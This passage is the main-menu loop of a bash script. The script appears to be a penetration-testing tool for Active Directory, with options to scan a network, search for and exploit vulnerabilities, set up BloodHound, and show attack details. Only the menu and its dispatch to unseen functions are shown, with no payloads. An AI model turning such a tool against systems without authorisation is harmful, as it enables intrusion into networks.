        "Option 1: Scanning network"
        "Option 2: Searching for known vulnerabilities"
        "Option 3: Exploiting vulnerabilities"
        "Option 4: Setting and requesting BloodHound"
        "Option 5: Adding or removing informations (accounts, etc.)"
        "Option 6: Show list of attacks and their details (description, exploitation steps, mitigations, etc.)"
        "Option 7: QUIT"
    )
    printf "%b%b\n=> MAIN MENU%b\n" "${BOLD}" "${UNDERLINE}" "${NC}"
    select item in "${items[@]}"
    do
        case $REPLY in
            1) printf "\nSelected item #%s: %s.\n" "$REPLY" "$(echo "$item" | cut -d ' ' -f3-)"; scanning_network; break;;
            2) printf "\nSelected item #%s: %s.\n" "$REPLY" "$(echo "$item" | cut -d ' ' -f3-)"; searching_vulns; break;;
            3) printf "\nSelected item #%s: %s.\n" "$REPLY" "$(echo "$item" | cut -d ' ' -f3-)"; exploiting_vulns; break;;
            4) printf "\nSelected item #%s: %s.\n" "$REPLY" "$(echo "$item" | cut -d ' ' -f3-)"; setting_bloodhound;break;;
            5) printf "\nSelected item #%s: %s.\n" "$REPLY" "$(echo "$item" | cut -d ' ' -f3-)"; add_infos;break;;
            6) printf "\nSelected item #%s: %s.\n" "$REPLY" "$(echo "$item" | cut -d ' ' -f3-)"; show_details_attacks;break;;
            7) quitting_cvad;break;;
            $((${#items[@]}+1))) quitting_cvad && echo "We're done!"; break;;
            *) printf "\nOoops - unknown choice %s\n" "$REPLY"; break;
        esac
    done
done